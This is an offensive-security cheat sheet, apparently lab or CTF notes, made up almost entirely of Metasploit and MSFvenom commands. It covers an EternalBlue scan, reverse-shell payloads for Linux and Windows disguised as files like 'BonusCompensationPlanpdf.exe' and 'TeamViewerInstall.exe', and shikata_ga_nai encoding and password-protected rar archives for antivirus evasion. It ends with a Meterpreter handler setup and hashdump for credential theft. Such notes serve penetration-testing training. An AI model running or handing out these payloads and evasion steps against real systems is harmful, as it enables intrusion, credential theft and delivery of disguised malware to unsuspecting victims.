targeturi = blog

# Metasploit
- `use auxiliary/scanner/smb/smb_ms17_010` (EternalBlue)
 
## Interact With the Shell
```
shell
python -c 'import pty; pty.spawn("/bin/sh")' 
```

## Search
- `search -f "flag.txt"`

# MSFvenom
- `msfvenom -l payloads`

## Building A Stageless Payload
- `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf`

## Building a simple Stageless Payload for a Windows system
- `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe`

## Selecting an Encoder
### Generating Payload
- `msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai`

### Generating Payload - Without Encoding
- `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`

### Generating Payload - With Encoding
- `msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`

- `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe`

## Evasion Techniques
- `msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5`

```
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
rar a ~/test.rar -p ~/test.js
```

```
mv test.rar test
rar a test2.rar -p test
mv test2.rar test2
```

## Setting Up Multi/Handler
- `use multi/handler`

# Meterpreter
- `getuid`
- `hashdump`
- `search local exploit suggester`